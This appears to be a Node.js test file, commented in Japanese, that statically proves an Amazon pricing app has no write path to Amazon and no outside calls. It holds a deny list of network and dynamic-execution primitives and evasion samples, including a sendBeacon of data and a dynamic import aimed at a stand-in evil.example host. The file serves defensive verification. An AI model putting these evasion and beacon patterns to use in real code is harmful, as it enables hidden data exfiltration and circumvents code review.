/**
 * test-no-write-path.mjs — 「Amazon へ書き込む経路が無い」ことを機械的に確かめる。
 *
 * ★このアプリの安全は kill switch ではなく「書き込むコードが存在しない」ことで担保している。
 *   env を入れても、API を直叩きしても、価格は変わらない。
 *   将来、実行段階 (M3) を足すときは、このテストを**意図して**書き換えることになる (= レビューで必ず目に入る)。
 *
 * 見るもの:
 *   1. apps/amazon-pricing/ の全ファイルに、SP-API の書き込み関数・miniPC の書き込み口・外部呼び出し・
 *      **動的実行 (dynamic import / eval / Function / require)** が無い。静的 import は許可リストだけ
 *   2. 許可した外部モジュール (format.js / warehouse-mirror/db.js) にも外部呼び出し・動的実行が無い
 *   3. 旧ツール (profit-calculator) に残っていた価格書き込みの口 (update-price / worker 起動) が消えている
 *   4. 旧ワーカー (price-scheduler.js / price-engine.js) が存在しない
 *   5. ★検査自身の検査: 回避コードの見本 (文字列連結・dynamic import・globalThis 経由 …) を
 *      検査に掛けて**必ず落ちる**ことを確かめる (Codex R1 High: 部分文字列だけの検査は偽陰性になる)
 *
 * 限界 (明記): これは静的検査で、実行環境の外向き通信を遮断するものではない。DB や env を書き換えられる
 * 権限を持つ人は対象外。通常のコードレビューを置き換えるものでもない。
 *
 * 実行: node apps/amazon-pricing/test-no-write-path.mjs
 */
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

const HERE = path.dirname(fileURLToPath(import.meta.url));
const ROOT = path.resolve(HERE, '../..');
let failed = 0;
const ok = (cond, label) => { console.log(`${cond ? '✅' : '❌'} ${label}`); if (!cond) failed++; };

// 単語を分けて書いてあるのは、このテスト自身が自分の禁止語に引っかからないようにするため
const j = (...parts) => parts.join('');

/** サーバ側 JS で禁止する語 (どれか 1 つでもあれば落ちる) */
const FORBIDDEN_JS = [
  // SP-API / miniPC の書き込み口
  j('update', 'Price'), j('patch', 'ListingsItem'), j('patch', 'Listing('), j('put', 'ListingsItem'), j('create', 'Feed'),
  j('service-api/', 'research'), j('call', 'MiniPC'), j('amazon-', 'sp-api'), j('sp-api', '.js'), j('WAREHOUSE', '_URL'),
  j('Selling', 'Partner'), j('client-', 'sqs'), j('purchasable', '_offer'), j('research-', 'service'),
  // 外部への通信そのもの
  j('fetch', '('), j('node:', 'http'), j('node:', 'net'), j("'http", "'"), j('"http', '"'), j("'https", "'"), j('"https', '"'),
  j("'net", "'"), j('"net', '"'), j('child_', 'process'), j('node:', 'dns'), j('WebSocket', ''), j('XMLHttp', 'Request'), j('undici', ''), j('axios', ''),
  // 動的実行・動的読み込み (禁止語を組み立てて回避する経路をまとめて塞ぐ)
  j('import', '('), j('eval', '('), j('new ', 'Function'), j('Function', '('), j('require', '('), j('create', 'Require'),
  j('globalThis', '['), j('process.', 'binding'), j('node:', 'vm'), j("'vm", "'"), j('worker_', 'threads'), j('.cjs', "'"),
  j('Reflect.', 'get'), j('Reflect.', 'apply'),
];
/** 画面 (ブラウザ側 JS) で禁止する語。fetch は自分の API 宛だけ許す (別で見る) */
const FORBIDDEN_VIEW = [
  j('import', '('), j('eval', '('), j('new ', 'Function'), j('XMLHttp', 'Request'), j('WebSocket', ''), j('send', 'Beacon'),
  j('globalThis', '['), j('window', '['),
];
/** 静的 import の許可リスト (アプリ内 ./ は別扱い) */
const ALLOWED_IMPORTS = new Set(['express', 'path', 'url', 'node:fs', 'node:path', 'node:url', 'node:os', 'better-sqlite3',
  '../warehouse-mirror/db.js', '../price-update/format.js']);
/** 計算プロパティで名前を組み立てる形 (obj['upd' + 'ate'] / obj[x + 'Price'])。角括弧の中に + と引用符の両方があれば疑う */
const COMPUTED_CONCAT_RE = /\[(?=[^\]\n]*\+)(?=[^\]\n]*['"`])[^\]\n]*\]/;

/**
 * 1 ファイルぶんの検査。問題の一覧を返す (空なら OK)
 * @param {string} src
 * @param {{isView?:boolean, checkImports?:boolean}} opts
 */
export function scanSource(src, { isView = false, checkImports = true } = {}) {
  const problems = [];
  if (isView) {
    for (const w of FORBIDDEN_VIEW) if (src.includes(w)) problems.push(`禁止語 "${w}"`);
    // 自分の API 以外への fetch。引用符が直後に無い呼び出し (変数・テンプレート) も禁止
    for (const m of src.matchAll(/fetch\s*\(\s*([^)]{0,60})/g)) {
      const arg = m[1];
      if (!/^['"]\/apps\/amazon-pricing\/api\//.test(arg)) problems.push(`自分の API 以外への fetch: ${arg.slice(0, 40)}`);
    }
    return problems;
  }
  for (const w of FORBIDDEN_JS) if (src.includes(w)) problems.push(`禁止語 "${w}"`);
  if (COMPUTED_CONCAT_RE.test(src)) problems.push('計算プロパティで名前を組み立てている (obj[a + b])');
  if (checkImports) {
    // import / export ... from の指定子を全部見る (行頭以外に書いた import も拾う)
    for (const m of src.matchAll(/\b(?:import|export)\b[^;'"]*?\bfrom\s*['"]([^'"]+)['"]/g)) {
      const spec = m[1];
      if (!spec.startsWith('./') && !ALLOWED_IMPORTS.has(spec)) problems.push(`許可外の import "${spec}"`);
    }
    for (const m of src.matchAll(/^\s*import\s*['"]([^'"]+)['"]/gm)) {
      problems.push(`副作用 import "${m[1]}"`);
    }
  }
  return problems;
}

function walk(dir, out = []) {
  for (const e of fs.readdirSync(dir, { withFileTypes: true })) {
    const p = path.join(dir, e.name);
    if (e.isDirectory()) walk(p, out);
    else if (/\.(js|mjs|cjs|ejs)$/.test(e.name) && !/^test-/.test(e.name)) out.push(p);
  }
  return out;
}

console.log('\n── 1. apps/amazon-pricing/ に書き込み経路・動的実行が無い ──');
{
  const files = walk(HERE);
  ok(files.length >= 8, `対象ファイル ${files.length} 本`);
  ok(files.every((f) => !f.endsWith('.cjs')), '.cjs (require が使える形式) が無い');
  for (const f of files) {
    const rel = path.relative(ROOT, f).replace(/\\/g, '/');
    const problems = scanSource(fs.readFileSync(f, 'utf8'), { isView: f.endsWith('.ejs') });
    ok(problems.length === 0, `${rel}: ${problems.length === 0 ? 'OK' : problems.join(' / ')}`);
  }
  // アプリ内 import (./x.js) の先も全部このディレクトリの中にある
  for (const f of files.filter((x) => /\.m?js$/.test(x))) {
    const src = fs.readFileSync(f, 'utf8');
    for (const m of src.matchAll(/\bfrom\s*['"](\.\/[^'"]+)['"]/g)) {
      const target = path.resolve(path.dirname(f), m[1]);
      ok(target.startsWith(HERE) && fs.existsSync(target), `${path.relative(ROOT, f).replace(/\\/g, '/')}: ./import "${m[1]}" はアプリ内に実在する`);
    }
  }
}

console.log('\n── 2. 許可した外部モジュールにも外部呼び出し・動的実行が無い ──');
{
  for (const rel of ['apps/price-update/format.js', 'apps/warehouse-mirror/db.js', 'apps/product-scout/schema.js', 'lib/rakuten-dd-columns.js']) {
    const problems = scanSource(fs.readFileSync(path.join(ROOT, rel), 'utf8'), { checkImports: false });
    ok(problems.length === 0, `${rel}: ${problems.length === 0 ? 'OK' : problems.join(' / ')}`);
  }
}

console.log('\n── 3. 旧ツールの書き込み口が消えている ──');
{
  const router = fs.readFileSync(path.join(ROOT, 'apps/profit-calculator/router.js'), 'utf8');
  ok(!router.includes(j("router.post('/api/amazon/", "update-price'")), 'profit-calculator: POST /api/amazon/update-price が無い');
  ok(!router.includes(j("'/api/price-revision/", "worker/start'")), 'profit-calculator: POST /api/price-revision/worker/start が無い');
  ok(!router.includes(j('start', 'PriceWorker')), 'profit-calculator: ワーカー起動の import が無い');
  ok(!router.includes(j("callMiniPC('/", "price'")), 'profit-calculator: miniPC の /price を呼ぶ関数が無い');
  const server = fs.readFileSync(path.join(ROOT, 'server.js'), 'utf8');
  // コメントで名前を挙げるのは構わない。import 文 (= 実行される) が無いことを見る
  ok(!new RegExp(`^import[^\\n]*${j('price-', 'scheduler')}`, 'm').test(server), 'server.js: price-scheduler を import していない');
  ok(!new RegExp(`^\\s*${j('start', 'PriceWorker')}\\(`, 'm').test(server), 'server.js: ワーカーを起動していない');
  ok(server.includes("requireAppAccess('amazon-pricing')"), 'server.js: 新アプリは画面権限つきでマウント');
}

console.log('\n── 4. 旧ワーカーのファイルが無い ──');
{
  for (const f of ['apps/profit-calculator/price-scheduler.js', 'apps/profit-calculator/price-engine.js']) {
    ok(!fs.existsSync(path.join(ROOT, f)), `${f} が存在しない`);
  }
}

console.log('\n── 5. ★検査自身の検査: 回避コードは必ず落ちる ──');
{
  const EVASIONS = [
    ['Codex R1 の見本 (dynamic import + 文字列連結)', `const m = await ${j('import', '(')}'../profit-calculator/' + 'sp-' + 'api.js'); await m['update' + 'Price']({ sku, price });`],
    ['globalThis 経由の fetch', `${j('globalThis', '[')}'fet' + 'ch']('https://x');`],
    ['eval', `${j('eval', '(')}'fe' + 'tch(1)');`],
    ['new Function', `const f = ${j('new ', 'Function')}('return 1');`],
    ['createRequire', `const r = ${j('create', 'Require')}(import.meta.url); r('https');`],
    ['node:https の import', `import https from '${j('node:', 'https')}';`],
    ['旧 SP-API モジュールの import', `import { x } from '../profit-calculator/${j('sp-api', '.js')}';`],
    ['許可外の再エクスポート', `export * from '../price-update/live-price.js';`],
    ['副作用 import', `import '../warehouse/research-service.js';`],
    ['計算プロパティ', `const fn = obj[name + 'Price'];`],
    ['Reflect 経由', `${j('Reflect.', 'get')}(obj, 'upd' + 'atePrice');`],
    ['fetch を変数に逃がす', `const f = ${j('fetch', '(')}url);`],
  ];
  for (const [label, code] of EVASIONS) {
    const problems = scanSource(code, { isView: false });
    ok(problems.length > 0, `落ちる: ${label} → ${problems[0] || '(検出できず)'}`);
  }
  const VIEW_EVASIONS = [
    ['外部への fetch', `${j('fetch', '(')}'https://evil.example/');`],
    ['変数 URL への fetch', `${j('fetch', '(')}url);`],
    ['sendBeacon', `navigator.${j('send', 'Beacon')}('https://evil.example/', data);`],
    ['XMLHttpRequest', `new ${j('XMLHttp', 'Request')}();`],
    ['dynamic import', `${j('import', '(')}'https://evil.example/m.js');`],
  ];
  for (const [label, code] of VIEW_EVASIONS) {
    const problems = scanSource(code, { isView: true });
    ok(problems.length > 0, `落ちる (画面): ${label} → ${problems[0] || '(検出できず)'}`);
  }
  // 正しい形は通る
  ok(scanSource(`${j('fetch', '(')}'/apps/amazon-pricing/api/policies/' + encodeURIComponent(sku), { method: 'POST' })`, { isView: true }).length === 0, '通る (画面): 自分の API への fetch');
  ok(scanSource(`import express from 'express';\nimport { getMirrorDB } from '../warehouse-mirror/db.js';\nimport { x } from './engine.js';`).length === 0, '通る: 許可リスト内の import');
}

console.log(`\n${failed === 0 ? '🎉 ALL PASS — Amazon へ書き込む経路はありません (静的検査の範囲で)' : `❌ ${failed} 件失敗`}`);
process.exit(failed === 0 ? 0 : 1);
